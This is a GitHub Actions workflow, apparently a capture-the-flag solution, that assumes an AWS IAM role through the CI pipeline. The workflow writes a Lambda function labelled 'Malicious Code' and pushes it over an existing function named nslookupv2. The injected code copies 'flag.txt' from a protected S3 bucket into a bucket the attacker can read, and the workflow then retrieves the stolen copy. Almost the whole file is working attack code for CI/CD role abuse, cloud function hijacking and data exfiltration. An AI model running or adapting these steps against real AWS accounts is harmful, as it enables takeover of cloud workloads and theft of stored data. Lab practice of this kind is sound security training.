name: Challenge Auth
on: [push]

jobs:
  auth-job:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Hijack Lambda Code
        run: |
          echo "=== Creating Malicious Code ==="
          cat << 'INNER_EOF' > lambda_function.py
          import boto3
          import logging

          def lambda_handler(event, context):
              s3 = boto3.client('s3')
              try:
                  # העתקת הקובץ מהבאקט המאובטח לבאקט הנגיש לנו
                  s3.copy_object(
                      Bucket='platform-bucket-009661764077-us-east-1',
                      Key='stolen_flag.txt',
                      CopySource={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'}
                  )
                  return {"status": "success"}
              except Exception as e:
                  return {"status": "error", "message": str(e)}
          INNER_EOF
          
          zip lambda_update.zip lambda_function.py
          
          echo "=== Injecting Code Into nslookupv2 ==="
          aws lambda update-function-code \
            --function-name nslookupv2 \
            --zip-file fileb://lambda_update.zip
            
          echo "=== Waiting for Lambda Execution/Trigger ==="
          sleep 10
          
          echo "=== Checking If Flag Was Exfiltrated ==="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/stolen_flag.txt - || true
